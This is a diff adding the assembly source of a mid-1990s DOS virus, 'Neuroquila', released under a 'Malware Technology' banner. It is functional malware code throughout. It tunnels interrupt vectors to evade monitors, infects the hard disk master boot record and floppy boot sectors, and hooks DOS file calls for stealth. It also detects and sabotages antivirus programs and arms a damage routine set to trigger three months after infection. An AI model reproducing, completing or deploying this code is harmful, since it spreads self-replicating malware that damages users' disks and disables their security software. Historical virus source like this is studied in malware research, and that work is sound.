@@ -1,0 +1,3015 @@
+;---------------------------------------------------------------------------;
+; Title: Neuroquila by Neurobasher                                          ;
+; (c) 1995    Malware Technology                                            ;
+; Disclaimer: Malware Technology is not responsible for any problems        ;
+;             caused due to assembly of this file.                          ;
+; Thanks to everyone who contributed to this huge source.                   ;
+;                                                                           ;
+; Release-Version                                                           ;
+;                                                                           ;
+; If you have any comments send them to na264720@anon.penet.fi              ;
+;---------------------------------------------------------------------------;
+; '***' == Bug report
+
+.286
+
+code1           segment
+		assume  cs:code1
+
+		mov     ax,4c00h
+		int     21h
+
+code1           ends
+
+code2           segment
+		assume  cs:code2, ds: code2
+
+newint21        equ     04E0h
+newint13        equ     04F0h
+switch_on       equ     090h            ; NOP
+switch_off      equ     0C3h            ; RET
+return          equ     0C3h            ; RET
+do_function     equ     090h            ; NOP
+boot_size       = ( offset boot_over - offset boot_code )
+memory_size     = ( offset memory_top - offset start + 15 ) / 16
+extra_size      = 24h           ; size added behind virus to host file
+marker          = 0F2h          ; infection marker
+
+
+;---------------------------------------------------------------------------------------;
+; Decryptor                                                                             ;
+;---------------------------------------------------------------------------------------;
+
+start:
+;       jmp     vir_start
+	db      0E9h
+	dw      offset vir_start - offset $ - 2
+	db      3Dh dup (?)
+
+;---------------------------------------------------------------------------------------;
+; virus body                                                                            ;
+;---------------------------------------------------------------------------------------;
+
+vir_start:
+	cld
+	sub     di,di
+	mov     ah,marker
+	int     13h                     ; Install check
+	jb      install                 ; was not installed yet
+	; Neuroquila allready resident
+installed:
+	mov     ah,62h
+	int     21h                     ; Get PSP address
+	mov     es,bx                   ; Set ES to PSP segment
+	sub     di,di
+	push    bx
+	dec     bx                      ; => MCB segment
+	mov     ds,bx
+;       mov     bx,0ffffh               ; Memory-size for program
+	db      0BBh
+progmem dw      0FFFFh
+	cmp     bh,50h
+	ja      not_fix_mem
+	mov     ax,word ptr ds:[3]
+	sub     ax,bx
+	sub     word ptr ds:[di+12h],ax
+	mov     ah,4ah
+	int     21h                     ; Adjust memory block size
+not_fix_mem:
+	pop     bx                      ; PSP segment
+	mov     ds,bx
+	add     bx,10h                  ; => base segment for relocation
+	cli
+;       mov     sp,01F4h                ; Initial SP
+	db      0BCh
+init_sp dw      0h
+;       lea     ax,[bx+0271h]           ; Initial SS
+	db      8Dh,87h
+init_ss dw      0
+	mov     ss,ax
+;       add     bx,word ptr 0
+	db      081h,0C3h
+init_cs dw      0h                      ; Initial CS
+	sti
+	pushf
+	push    bx
+;       push    word ptr 0              ; Initial IP
+	db      68h
+init_ip dw      0h
+	sub     bx,bx
+	xor     cx,cx
+	mov     dx,cx
+	xor     si,si
+	mov     bp,si
+virint24:
+	xor     ax,ax
+	iret                            ; jump to original program
+
+install:
+	call    flex1                   ; flexible entry point
+flex1:
+	pop     si                      ; get offset of flex1
+	mov     cx,offset my_size       ; virus size
+	sub     si,offset flex1         ; calculate offset of virus begin
+	push    cs
+	pop     ds                      ; DS := CS
+;       push    word ptr 07C00h
+	db      68h,0,07ch
+	pop     es                      ; ES := 07C00h
+	push    es
+;       push    offset start_over
+	db      68h
+	dw      offset start_over
+	rep     movsb                   ; Copy virus to segment 07C00h
+	retf                            ; start over into new segment
+
+start_over:
+;       push    byte ptr ( offset installed )
+	db      6Ah
+	db      offset installed
+	mov     ah,52h                  ; Get list of lists
+	int     21h                     ; (only the segment value is used)
+	mov     bx,21h*4
+	mov     ds,cx                   ; DS := 0
+assume  ds:nothing
+	mov     word ptr cs:tun_stop_seg,es     ; save segment of list of lists
+assume  ds:code2
+	; Get old and set new int 01h vector
+	mov     ax,offset newint01
+	xchg    ax,word ptr ds:[bx-(21h*4-1*4)]
+	push    ax
+	mov     ax,cs
+	xchg    ax,word ptr ds:[bx-(21h*4-1*4)+2]
+	push    ax
+	; Enable tracing mode
+	pushf
+	pop     ax
+	or      ah,1
+	push    ax
+	popf
+	; Call Int 21h for tracing
+	mov     ah,4dh
+	pushf
+	call    dword ptr ds:[bx]
+assume  ds:nothing
+	; Save tunneled int 21h value
+	mov     ax,tunneled_ofs
+	mov     tun21_ofs,ax
+	mov     ax,tunneled_seg
+	mov     tun21_seg,ax
+	; Tunnel Int 13h now
+	mov     tun_stop_seg,0f000h             ; set system segment to 0F000h
+assume  ds:code2
+	mov     ah,0
+	cwd
+	pushf
+	call    dword ptr ds:[bx-(21h*4-13h*4)]
+	; Restore old int 01 vector
+	pop     word ptr ds:[bx-(21h*4-1*4)+2]
+	pop     word ptr ds:[bx-(21h*4-1*4)]
+	; Install int 13h and 21h
+	call    make_bios_progs
+	mov     word ptr ds:[di-14h],offset vir_int21
+	mov     word ptr ds:[di-4],offset virus_13
+	mov     ax,newint13
+	mov     dx,ax
+	mov     bh,13h
+	xchg    bx,ax
+	int     2Fh             ; set actual and permanent int 13h vector to newint13
+assume  ds:nothing
+	lds     di,dword ptr cs:tun21_ofs       ; for the case DOS-version is lower than 5
+						; load the address of tunneled int 21h here
+assume  ds:code2
+	call    patch_int21
+infect_hdd:
+	pusha
+	push    cs
+	pop     ds
+	push    cs
+	pop     es
+	cmp     dl,80h          ; booting from harddisk ?
+	jz      booted_hdd      ; yes
+	; set new activation date to 3 months after now (ignoring days)
+	mov     ah,04h
+	int     1ah             ; Get RTC-date
+	mov     al,dh           ; month
+	add     al,3            ; 3 months later
+	daa                     ; hex -> bcd after addition
+	cmp     al,12h
+	jbe     month_ok
+	sub     al,12h          ; switch over to next year
+	inc     cx
+month_ok:
+	mov     activ_month,al          ; 1..12 (BCD)
+	mov     activ_year,cl           ; this year+[0,1]
+
+booted_hdd:
+	; read MasterBootRecord
+	mov     ax,201h
+	mov     bx,offset disk_buff
+	mov     cx,1
+	mov     dx,80h
+	call    call_int13
+	cmp     byte ptr ds:[bx+9],08Eh ; infected ?
+	jz      partt_infected                  ; yes
+	; search for boot-partition
+	mov     cl,4
+	lea     si,[bx+01AEh]
+next_partition:
+	add     si,10h
+	cmp     byte ptr [si],dl
+	loopnz  next_partition
+	jcxz    partt_infected          ; No bootable partition
+	; Test if it is a DOS-Partition
+	mov     al,byte ptr [si+4]
+	cmp     al,1                    ; DOS 12-bit ?
+	jz      dos_12bit_fat           ; Yes
+	cmp     al,4
+	jb      partt_infected          ; type 2,3 are not DOS
+	cmp     al,6                    ; types 7,8,... are not DOS
+	ja      partt_infected
+dos_12bit_fat:
+	; Booting Partition is DOS
+	mov     ax,word ptr [si+8]
+	cmp     al,11h                  ; at least 17 sectors per track ?
+	jb      partt_infected          ; no
+	; infect the fixed disk 0
+	call    encrypt_sector          ; encrypt the old partition table
+	mov     cl,7            ; Sector 7
+	call    write_1_sect            ; write it to Track 0 Side 0 Sector 7
+	inc     cx                      ; next sector (Track 0 Side 0 Sector 8)
+	mov     track_head,cx           ; save as position of 2nd virus-part
+	mov     side_drive,dx
+	push    bx
+	xor     bx,bx
+	mov     ax,0309h                ; write 9 sectors (1200h Byte)
+	call    call_int13              ; this virus
+	pop     bx
+	mov     si,offset boot_code             
+	mov     di,bx
+	mov     cl,boot_size
+	rep     movsb                   ; copy MBR-code
+	mov     al,2
+	mov     cx,200h - 2 - boot_size         ; Fill up to 1FEh 
+	rep     stosb
+	mov     cl,1
+	call    write_1_sect            ; write the new MBR 
+	; encrypt boot sector on Track 0 Side 1 Secctor 1 of fixed disk 0
+	mov     ax,0201h
+	mov     dh,1
+	call    call_int13              ; read Track 0 Side 1 Sector 1
+	call    encrypt_sector          ; encode it
+	call    write_1_sect            ; write it back
+
+partt_infected:
+	popa
+	ret
+
+;---------------------------------------------------------------------------------------;
+; Tunneler code                                                                         ;
+;---------------------------------------------------------------------------------------;
+
+;assume ds:code2
+newint01:
+	pusha
+	push    ds
+	mov     bp,sp
+	lds     si,dword ptr [bp+12h]           ; load address of break
+	call    int01patches
+	cmp     ax,0cfcch                       ; INT3; IRET
+						; QEMM Int 13h trap
+	jz      tun_success
+	cmp     ax,08063h
+	jnz     no_special_tunneling
+	cmp     word ptr [si+4],1172h
+	jnz     no_special_tunneling
+	cmp     word ptr [si+0eh],0CFE4h
+	jz      tun_success
+	cmp     ax,0ff2eh                       ; *** AX is allready 8063h
+	jnz     no_special_tunneling
+	; never comes to this point
+	; but maybe it's for smartdrv but not for 5.0
+	cmp     word ptr [si+9],09AFAh
+	jz      tun_success
+	; end of unused code
+no_special_tunneling:
+	mov     ax,ds
+;       cmp     ax,0f000h
+	db      3Dh
+tun_stop_seg    dw      0F000h                  ; segment for tunnel success
+	jnz     tun_exit
+tun_success:
+assume  ds:nothing
+	mov     ax,ds
+	mov     tunneled_seg,ax
+	mov     ax,word ptr [bp+12h]
+	mov     tunneled_ofs,ax
+	and     byte ptr [bp+17h],0FEh          ; switch tracing mode off
+assume  ds:code2
+tun_exit:
+	pop     ds
+	popa
+	iret
+
+;---------------------------------------------------------------------------------------;
+; Boot code                                                                             ;
+; only 1Eh Byte in the MBR or bootsector !!!                                            ;
+;---------------------------------------------------------------------------------------;
+boot_code:
+	cli
+	xor     ax,ax
+	mov     ss,ax                   ; SS := 0
+	mov     sp,7c00h
+	sti
+	mov     es,sp                   ; ES := 7C00h
+	push    es
+;       push    offset boot_over
+	db      68h
+	dw      offset boot_over
+	xchg    bx,ax                   ; BX := 0
+	; read second part of virus
+	mov     ax,209h
+;       mov     cx,8
+	db      0B9h
+track_head      dw      8               ; track and head of 2nd virus-part
+;       mov     dx,80h
+	db      0BAh
+side_drive      dw      80h             ; side and drive of 2nd virus-part
+	int     13h
+	jb      $
+	retf                    ; start over to second part
+	; End of code stored in MBR or Bootsector
+
+boot_over:
+	cld
+	call    make_bios_progs ; install the two programs into the BIOS-area
+	push    es
+	push    cs
+	pop     es
+	; set new int 13h and save old
+	mov     ax,newint13
+	mov     si,21h*4
+	mov     di,offset tunneled_ofs
+	xchg    ax,word ptr [si-(21h*4-13h*4)]
+	stosw
+	xor     ax,ax
+	xchg    ax,word ptr [si-(21h*4-13h*4)+2]
+	stosw
+	; save int 21h vector
+	movsw
+	movsw
+	; load old boot-code
+	pop     es
+	mov     ax,201h
+	mov     bx,sp
+	dec     cx
+	int     13h                     ; read old bootsector or MBR
+	or      dl,dl                   ; is it a diskette ?
+	jz      booting_disk            ; yes
+	call    encrypt_sector          ; from HDD decrypt old boot-code
+booting_disk:
+	; Patch some code in the original partition table or boot-sector
+	push    es
+	push    bx
+	mov     cl,0ffh
+boot_patch_loop:
+	inc     bx
+	cmp     word ptr [bx],73C2h
+	jnz     @@108
+	mov     byte ptr [bx+1],0EBh
+@@108:
+	cmp     word ptr [bx],75A7h
+	jnz     @@109
+	mov     byte ptr [bx+2],ah
+@@109:
+	loop    boot_patch_loop
+	; infect the HDD now
+	call    infect_hdd
+	; Setup damage function
+	inc     ax
+	mov     damage_delay,ax
+	mov     ah,4
+	int     1ah                     ; Hole RTC Datum
+;       cmp     cl,90h
+	dw      0F980h
+activ_year      db      90h                     ; Year
+	ja      sw_damage_on
+	jb      sw_damage_off
+;       cmp     dh,4
+	dw      0FE80h
+activ_month     db      4                       ; Month
+	jb      sw_damage_off
+sw_damage_on:
+	; Switch on damage function if
+	;   ( actual year > activ_year ) or 
+	; ( ( actual year = activ_year ) and ( actual month >= activ_month ) )
+	mov     byte ptr damage_switch,switch_on
+sw_damage_off:
+	; start over to original boot-code
+	retf
+
+		
+;---------------------------------------------------------------------------------------;
+; Installs to programs in the BIOS data area                                            ;
+; At 0:4F0 JMP FAR virus_seg:virint13                                                   ;
+; At 0:4E0 JMP FAR virus_seg:temp_int21                                                 ;
+;---------------------------------------------------------------------------------------;
+assume  ds:nothing
+make_bios_progs:
+	mov     byte ptr damage_switch,switch_off
+	xor     ax,ax
+	mov     ds,ax                   ; DS := 0
+	mov     es,ax                   ; ES := 0
+	mov     v_int21_running,al
+	mov     virus_moved_from_fixed_segment,ax
+	mov     di,newint13             ; 0:newint13 is the new int 13h entry point
+	mov     al,0EAh                 ; put a JMP FAR there
+	stosb
+	mov     byte ptr [di-(newint13-newint21+1)],al  ; also put one at 0:newint21
+	mov     ax,offset virint13
+	stosw
+	mov     word ptr [di-(newint13-newint21+2)],offset temp_int21
+	mov     ax,cs
+	stosw
+	mov     [di-(newint13-newint21+2)],ax
+		; JMP FAR virint13 at 0:newint13  and
+		; JMP FAR temp_int21 at 0:newint21
+	ret                             ; bacck to caller
+
+;---------------------------------------------------------------------------------------;
+; The virus int 13h                                                                     ;
+;                                                                                       ;
+;---------------------------------------------------------------------------------------;
+virint13:
+	; Setup int 21h and 13h if the time comes.
+	pusha
+	push    ds
+	push    es
+;       push    byte ptr 0
+	db      06Ah,0
+	pop     ds                              ; DS := 0
+	cmp     byte ptr ds:[21h*4+3],08h       ; it's allready time to hook int 21h
+	ja      DOS_not_loaded_yet              ; no
+	mov     word ptr ds:[newint13+1],offset virus_13 ; set address of patch code
+						; in the JMP FAR
+	lds     di,dword ptr ds:[21h*4]
+	call    patch_int21                             ; Set new int 21h
+DOS_not_loaded_yet:
+	pop     es
+	pop     ds
+	popa
+
+virus_13:
+	call    damage_switch   ; do damage function
+	inc     int13_counter
+	; Test if the virus does this call
+	cmp     sp,1300h
+	jb      not_from_virus
+	cmp     sp,1600h
+	ja      not_from_virus
+	cmp     ah,marker
+	jz      install_check
+not_from_virus:
+	cmp     ah,2                    ; read from disk/hdd ?
+	jz      int13_read_write        ; yes
+	cmp     ah,3                    ; write to disk/hdd ?
+	jnz     leave_int13             ; no
+int13_read_write:
+	cmp     dx,2            ; Diskdrive A or B ?
+	jb      infect_disk     ; Yes
+	cmp     dl,80h          ; HDD 0
+	jnz     leave_int13     ; No
+	cmp     cx,1            ; track 0 sector 1 ?
+	jnz     hdd_access      ; No
+	cmp     dh,1            ; head 0 or 1 ?
+	ja      leave_int13     ; no
+boot_infected:
+	push    cx
+	dec     al
+	jz      only_one_sector         ; only one sector to read
+	; read the other sectors
+	push    ax
+	push    bx
+	add     bh,2
+	inc     cx
+	call    call_int13
+	dec     cx
+	pop     bx
+	pop     ax
+only_one_sector:
+	; read boot or MBR
+	mov     al,1
+	cmp     dl,1            ; discette ?
+	ja      hdd_read_write  ; no
+	mov     cx,5001h        ; read orig. boot from extra track
+	call    call_int13
+	jmp     disk_done
+hdd_read_write:
+	or      dh,dh
+	jnz     hdd_bootsector  ; read boot directly
+	mov     cl,7            ; read sector 7 instead of partt
+hdd_bootsector:
+	call    crypted_int13
+disk_done:
+	pop     cx
+int13_ok2:
+	retf    2               ; end the int 13
+
+
+leave_int13:
+	jmp     dword ptr tunneled_ofs
+
+hdd_access:
+	or      dh,dh           ; access to side 0 ?
+	jnz     leave_int13     ; no
+	push    ax
+	mov     ax,cs
+	cmp     ah,7ch          ; I am running at segment 7cxxh ?
+	pop     ax
+	jz      leave_int13     ; yes, then do nothing
+	cmp     cx,11h          ; access to sector 12 or above ?
+	ja      leave_int13     ; yes
+	cmp     cl,6            ; access to sector 5 or below
+	jb      leave_int13     ; yes
+no_int13_error:
+	mov     ah,0            ; just say no error
+install_check:
+	clc
+int13_ok1:
+	jmp     int13_ok2
+
+infect_disk:
+	cmp     cx,1            ; track 0 sector 1 ?
+	jnz     leave_int13     ; No
+	push    ax
+	call    call_int13      ; read or write it
+	jnb     disk_ok         ; no error
+	; there was an error
+	inc     sp
+	inc     sp
+	stc
+	jmp     int13_ok1
+
+disk_ok:
+	pop     ax
+	cmp     byte ptr es:[bx+01FDh],marker   ; read or written boot infeted ?
+	jz      boot_infected                   ; yes
+	pusha
+	push    ds
+	push    es
+	push    es
+	pop     ds
+	push    cs
+	pop     es
+	; copy old sector to disk_buff
+	mov     si,bx
+	mov     di,offset disk_buff
+	mov     cx,100h
+	cmp     v_int21_running,cl      ; virus int 21h just running ?
+	jnz     not_bootable            ; yes
+	rep     movsw                   ; copy now
+	cmp     byte ptr [bx],0EBh      ; jmp short on begin ?
+	jnz     not_bootable            ; no
+	mov     ax,word ptr [bx+13h]    ; sectors on disk
+	mov     di,offset disk_35       ; offset of drive descriptor table
+	cmp     ax,0b40h                ; 3.5" HD disk ?
+	jz      disk_1_44_MB            ; yes
+	mov     di,offset disk_525      ; offset of drive descriptor table
+	cmp     ax,0960h                ; 5.25" HD disk ?
+not_bootable:
+	jnz     no_std_disk             ; no
+disk_1_44_MB:
+	push    cs
+	pop     ds
+	mov     ax,0351Eh               ; get int 1Eh
+	int     21h
+	push    bx
+	push    es
+	mov     ah,25h                  ; set new table address
+	push    ax
+	push    dx
+	mov     dx,di
+	int     21h
+	pop     dx
+	push    cs
+	pop     es
+	; generate a table with 10 sectors
+	; for Track 80 Side 0 with 512 byte-sectors
+	mov     bp,50h                  ; Track 80
+	mov     cl,0ah                  ; 10 Sectors
+	mov     di,offset disk_table    ; Address for buffer
+	mov     bx,di
+sector_loop:
+	mov     ax,bp
+	stosw
+	mov     al,cl
+	neg     al
+	add     al,0bh
+	mov     ah,2
+	stosw
+	loop    sector_loop
+	; format the extra track
+	mov     ax,050Ah
+	mov     cx,5001h
+	call    call_int13
+	jb      disk_infection_failed
+	; write first sector
+	mov     bx,offset disk_buff
+	call    write_1_sect
+	jb      disk_infection_failed
+	;
+	inc     cx              ; next sector
+	; write virus in the other 9 sectors
+	mov     ax,0309h
+	xor     bx,bx
+	call    call_int13
+	jb      disk_infection_failed
+assume  ds:code2
+	; Save posititon on disk
+	mov     track_head,cx
+	mov     side_drive,bx
+	; Get position the initial jump of the boot-sector goes to
+	xchg    bx,ax
+	mov     bx,offset disk_buff
+	mov     al,byte ptr [bx+1]
+	xchg    di,ax
+	lea     di,[bx+di+2]                    ; di := jump destination
+	; copy boot_code to this position
+	mov     si,offset boot_code
+	mov     cx,boot_size
+	rep     movsb
+	; write it to boot sector of disk
+	mov     byte ptr [bx+1FDh],marker               ; mark infected
+	mov     cl,1
+	call    write_1_sect            ; write one sector
+disk_infection_failed:
+	pop     ax
+	pop     ds
+	pop     dx
+	int     21h
+no_std_disk:
+	pop     es
+	pop     ds
+	popa
+	jmp     no_int13_error
+
+;---------------------------------------------------------------------------------------;
+; Set new int 21h by patching it into the original int 21h                              ;
+;---------------------------------------------------------------------------------------;
+patch_int21:
+	mov     ah,30h
+	int     21h                             ; Get DOS version
+	cmp     al,5
+	jb      no_dos5                         ; lower than 5.0
+	mov     ah,52h                          ; Get list of lists
+	int     21h
+	push    es
+	pop     ds                              ; DS := segment of list of lists
+	mov     di,109eh                ; DOS 5+ int 21h entry if loaded into HMA
+no_dos5:
+assume  ds:nothing
+	mov     cx,1                    ; CX := 1
+	mov     tun21_ofs,di                    ; set tunneled int 21h vector
+	mov     tun21_seg,ds
+	mov     ax,word ptr [di]                ; load 2 bytes from there
+	cmp     al,90h                  ; NOP ?
+	jz      int21_nop               ; DOS int entry
+	cmp     ax,0EB03h               ; Useless Short-Jump ?
+	jnz     int21_no_jmp_near       ; test for another DOS-Entry
+int21_nop:
+	mov     di,word ptr [di+8]      ; load address where the address is stored
+	les     di,dword ptr [di]       ; load int address from there
+	jmp     patch_done
+int21_no_jmp_near:
+	cmp     ax,03A2Eh               ; CS: CMP ?
+	jnz     int21_no_cmp
+	inc     cx                      ; 2 NOPs to add
+	push    ds
+	pop     es
+	jmp     patch_done
+int21_no_cmp:
+	cmp     al,0EAh                 ; JMP FAR ?
+	jnz     int21_no_patch
+	les     di,dword ptr [di+1]     ; load address it jumps to
+	dec     cx                      ; no NOP to add
+patch_done:
+	; Insert a call far at routine called
+	mov     al,9Ah                  ; CALL FAR
+	cld
+	stosb
+	mov     ax,newint21
+	stosw
+	xor     ax,ax
+	stosw
+	mov     al,90h
+	rep     stosb
+int21_no_patch:
+	ret
+
+;---------------------------------------------------------------------------------------;
+; Memory allocation routine                                                             ;
+;---------------------------------------------------------------------------------------;
+;assume ds:nothing
+alloc_mem:
+	mov     ax,4300h
+	int     2fh                     ; XMS driver installed ?
+	cmp     al,80h
+	jnz     no_xms_driver
+	mov     ax,4310h                ; Get driver entry point into ES:BX
+	int     2fh
+	mov     word ptr xms_addr,bx
+	mov     word ptr xms_addr+2,es
+	mov     ah,10h                  ; Alloccate UMB
+	mov     dx,di                   ; size in paragraphs
+	call    xms_addr                ; Call Memory-Manager
+	dec     ax                      ; successfull allocated
+	jnz     no_xms_driver           ; No
+	mov     bp,bx                   ; allocated segment
+	ret
+no_xms_driver:
+	; try in the UMB's via DOS and in conventional memory then
+	mov     ax,5800h
+	int     21h                     ; Get allocation strategy
+	push    ax
+	mov     ax,5801h
+	push    ax
+	mov     bx,0080h
+	int     21h                     ; Set allocation strategy first fit, try high
+					; then low
+	mov     ax,5802h
+	int     21h                     ; get UMB link sate
+	mov     ah,0
+	push    ax
+	mov     ax,5803h
+	push    ax
+	mov     bl,1
+	int     21h                     ; set UMB link state ON
+	mov     ah,48h
+	mov     bx,di
+	int     21h                     ; Allocate BX paragraphs of mem
+	xchg    bp,ax                   ; save allocated segment to BP
+	pop     ax
+	pop     bx
+	int     21h                     ; restore UMB link state
+	pop     ax
+	pop     bx
+	int     21h                     ; restore allocation strategy
+	ret
+
+;---------------------------------------------------------------------------------------;
+; The virus' int 21h                                                                    ;
+;---------------------------------------------------------------------------------------;
+
+;assume ds:nothing
+temp_int21:
+;       jmp     near allready_moved
+	db      0E9h
+virus_moved_from_fixed_segment  dw      (offset allready_moved - offset $) - 2
+; coming to this point after a patch is done to virus_moved_from_fixed_segment
+	mov     byte ptr virus_moved_from_fixed_segment,( offset @@65 - offset virus_moved_from_fixed_segment) - 2
+	pusha
+	call    patch_new_intcode
+	mov     bx,dx
+	mov     cx,80h
+	cmp     bh,0FFh
+	jz      try_to_move_virus
+	cmp     byte ptr [bx+1],3Ah             ; ':'
+						; driveletter given ?
+	jnz     try_to_move_virus               ; no
+next1_filename_char:
+	cmp     byte ptr [bx],2Eh               ; '.' ?
+	jnz     no_av_proggi
+	cmp     word ptr [bx-2],504Fh           ; 'PO.' ?
+	jz      its_av_proggi
+	cmp     word ptr [bx-2],4154h           ; 'TA.' ?
+	jz      its_av_proggi
+	cmp     word ptr [bx-5],4351h           ; 'QC???.' ?
+					; Wasn't it a program from AVTK ?
+	jnz     no_av_proggi
+its_av_proggi:
+	inc     byte ptr [bx]                   ; '.' -> '/'
+	mov     ax,0920h
+	xor     bx,bx                   ; screen page 0, black on black
+	mov     cl,0F0h                         ; write 240 spaces
+	int     10h
+	xchg    bx,ax                           ; virus not moved
+	jmp     do_not_move
+
+no_av_proggi:
+	inc     bx                              ; next char
+	loop    next1_filename_char
+
+try_to_move_virus:
+	push    ds
+	push    es
+	mov     ah,52h
+	int     21h                     ; get list of lists
+	mov     ds,word ptr es:[bx-2]   ; segment of first MCB
+	mov     si,10h
+	cmp     byte ptr [si-0ch],80h   ; block-size > 80FFh paragraphs ?
+	mov     al,0
+	ja      DOS2_not_loaded_yet     ; yes
+	mov     di,memory_size          ; size of memory block needed
+	call    alloc_mem               ; (in paragraphs)
+	mov     dx,bp
+	cmp     dh,0A0h
+	jb      in_low_mem
+	dec     bp
+	mov     ds,bp
+	mov     ax,di
+	mov     word ptr [si-0fh],8     ; mark as system MCB
+	jmp     move_virus
+in_low_mem:
+	push    ds
+	cmp     byte ptr [si],46h               ; FILES= ?
+	jz      next_subMCB                     ; yes
+	cmp     byte ptr [si],44h               ; DEVICE= ?
+	jnz     no_subMCB                       ; no
+next_subMCB:
+	cmp     byte ptr [si],4Dh               ; next normal MCB ?
+	jz      last_subMCB                     ; yes
+	cmp     byte ptr [si],54h               ; INSTALL= ?
+	jz      last_subMCB                     ; yes
+	mov     ax,word ptr [si+1]              ; MCB owner
+	dec     ax
+	mov     es,ax
+	add     ax,word ptr [si+3]              ; + size of memory block
+	mov     ds,ax
+	jmp     next_subMCB                     ; test again
+last_subMCB:
+	lea     ax,[bp+di]
+	sub     ax,es:[si-0fh]
+	mov     es:[si-0dh],ax
+no_subMCB:
+	pop     ds                      ; segment of first MCB
+	mov     ax,ds
+	sub     bp,ax           ; ofs of allocated seg to first MCB in paras
+	xchg    bp,ax
+	add     ax,memory_size - 1      ; fix first MCBs len to fit virus in
+
+move_virus:
+	mov     virus_segment,ds
+	push    cs
+	pop     ds
+assume  ds:code2
+	mov     virusMCB_size,ax
+	mov     es,dx
+	mov     al,(offset allready_moved - offset virus_moved_from_fixed_segment) - 2
+	mov     byte ptr virus_moved_from_fixed_segment,al
+	mov     cx,offset memory_top
+	xor     si,si
+	xor     di,di
+	cld
+	rep     movsb
+	mov     ds,cx
+	mov     word ptr ds:[newint21+3],es
+	mov     word ptr ds:[newint13+3],es
+	
+DOS2_not_loaded_yet:
+	pop     es
+	pop     ds
+assume  ds:nothing
+do_not_move:
+	mov     byte ptr virus_moved_from_fixed_segment,al
+	popa
+
+@@65:
+	retf
+
+allready_moved:
+	; patch addresses in the two programs at 0:4E0 and 0:4F0
+	push    ds
+;       push    word ptr 0C801h
+		db      68h
+virus_segment   dw      0C801h
+	pop     ds
+;       mov     word ptr [3],014Eh      
+	db      0C7h,06h
+	dw      3
+virusMCB_size   dw      014Eh
+
+	pop     ds
+
+vir_int21:
+;assume ds:nothing
+	; JMP SHORT
+	db      0EBh
+v_int21_running         db      offset short_int21 - offset $ - 1
+	; save all registers on Int 21h call
+	mov     save_ds,DS
+	push    cs
+	pop     ds
+assume  ds:code2
+	mov     save_bx,bx
+	mov     bx,offset save_bx
+	mov     word ptr [bx+(offset save_ax-offset save_bx)],ax
+	mov     word ptr [bx+(offset save_cx-offset save_bx)],cx
+	mov     word ptr [bx+(offset save_dx-offset save_bx)],dx
+	mov     word ptr [bx+(offset save_si-offset save_bx)],si
+	mov     word ptr [bx+(offset save_di-offset save_bx)],di
+	mov     word ptr [bx+(offset save_bp-offset save_bx)],bp
+	mov     word ptr [bx+(offset save_es-offset save_bx)],es
+	mov     byte ptr [bx+(offset v_int21_running-offset save_bx)],offset short_int21-offset v_int21_running - 1
+	inc     int21_counter
+	cld
+	call    damage_switch
+	mov     al,ah
+	push    ds
+	mov     cx,0eh
+	pop     es
+	mov     di,offset dos_functions
+	repnz   scasb           ; called function hooked by virus ?
+	jnz     not_hooking
+	shl     cx,1            ; *2
+	add     bx,cx
+		; pushh address on stack
+	push    offset not_hooking      ; return address
+	push    word ptr [bx+(offset dos_procs - offset save_bx)]
+				; addr of responding virus function
+	; Init values for int
+reg_restore:
+;       mov     bx,
+	db      0BBh
+save_bx dw      ?
+;       mov     bp,
+	db      0BDh
+save_bp dw      ?
+;       mov     ax,
+	db      0B8h
+save_ax dw      ?
+;       mov     si,
+	db      0BEh
+save_si dw      ?
+;       mov     cx,
+	db      0B9h
+save_cx dw      ?
+;       mov     di,
+	db      0BFh
+save_di dw      ?
+;       mov     dx,
+	db      0BAh
+save_dx dw      ?
+;       push    word
+	db      68h
+save_ds dw      ?
+	pop     ds
+;       push word
+	db      68h
+save_es dw      ?
+	pop     es
+	ret
+
+not_hooking:
+	call    restreg_and_prep_leaving
+short_int21:
+	cmp     ah,6ch
+	ja      set_zflag_and_leave_21          ; all functions above 6ch produce a Zero-Flag
+	retf                                    ; jump to
+set_zflag_and_leave_21:
+	add     sp,4
+	xor     al,al
+	retf    2
+
+restreg_and_prep_leaving:
+	call    reg_restore
+assume  ds:nothing
+prepare_leave_int21:
+	mov     byte ptr v_int21_running,0
+	ret
+
+dos_functions   db      4bh,4ch,11h,12h,4eh,4fh,42h,3fh,3eh,3dh,32h,44h,25h,40h
+dos_procs       dw      offset dosf_40          ; write to handle-file
+		dw      offset dosf_25          ; set int
+		dw      offset dosf_44          ; IOCTL
+		dw      offset dosf_32          ; get DPB
+		dw      offset dosf_3d          ; open handle-file
+		dw      offset dosf_3e          ; close handle-file
+		dw      offset dosf_3f          ; read from handle-file
+		dw      offset dosf_42          ; seek in handle file
+		dw      offset dosf_4f          ; FindNext
+		dw      offset dosf_4e          ; FindFirst
+		dw      offset dosf_11_12       ; FindNext FCB
+		dw      offset dosf_11_12       ; FindFirst FCB
+		dw      offset dosf_4c          ; Terminate program
+		dw      offset dosf_4b          ; Execute program
+
+tbav_cmdline    db      ' CO ',0
+win_cmdline     db      '/D:F ',0
+
+dosf_4b:
+	cmp     al,0                    ; Execute ?
+	jz      dosf_3d
+	cmp     al,1                    ; Load ?
+	jnz     open_4b_error           ; no something else
+	mov     ax,3d02h                ; open file being loaded for reading
+	call    do_int21                ; and writing
+	jc      open_4b_error
+	xchg    bx,ax
+	call    dosf_40                 ; disinfect the file
+	mov     ah,3eh                  ; close file
+	int     21h
+open_4b_error:
+	ret
+dosf_3d:
+	; DS:DX points to ASCIIZ-Filename
+	call    dosf_4c
+	push    ax                      ; Save ax
+	mov     si,dx                   ; DS:SI now points to filename
+	mov     di,offset filename
+	push    cs
+	pop     es                      ; ES := CS
+store_filename:
+	lodsb                           ; load one char and store
+	stosb
+	or      al,al                   ; until last char
+	jnz     store_filename
+	push    cs
+	pop     ds                      ; DS := CS
+	pop     cx                      ; function number passed in AX
+	cmp     ch,3Dh                  ; open file ?
+	jnz     not_open_file           ; next test
+on_open_file:
+	ret
+
+	; Coming to this code byte patching on_open_file
+	cmp     word ptr [di-0dh],04D53h        ; 'SM' ?
+	jnz     @@118                           ; No
+	cmp     word ptr [di-07h],04B48h        ; 'HK' ?
+	jz      @@119                           ; yes
+@@118:
+	cmp     word ptr [di-0ch],04843h        ; 'CH' ?
+	jnz     open_4b_error                   ; No
+	cmp     word ptr [di-0ah],04C4Bh        ; 'KL' ?
+	jnz     open_4b_error                   ; no
+@@119:
+	call    restreg_and_prep_leaving
+	add     sp,6                    ; remove cs/ip/flags from stack
+	mov     ax,2                    ; error-code 2 (file not found)
+	stc
+	retf    2
+assume  ds:code2
+not_open_file:
+	cmp     ch,4bh
+	jnz     chk4win
+	mov     byte ptr on_open_file,return
